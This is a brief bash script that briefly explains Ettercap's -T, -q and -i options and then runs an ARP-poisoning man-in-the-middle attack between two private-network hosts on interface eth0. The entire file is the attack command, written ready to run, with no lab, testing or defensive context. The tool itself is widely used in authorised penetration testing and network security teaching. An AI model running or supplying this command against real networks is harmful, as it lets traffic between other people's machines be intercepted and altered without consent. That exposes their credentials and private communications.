#!/bin/bash
# Ettercap - Man-in-the-Middle attack tool
# Options:
# -T : Text mode
# -q : Quiet mode
# -i : Interface

# Usage: ettercap -T -q -i <interface> -M arp:remote /<target1>/ /<target2>/
# Example script
ettercap -T -q -i eth0 -M arp:remote /192.168.1.1/ /192.168.1.2/
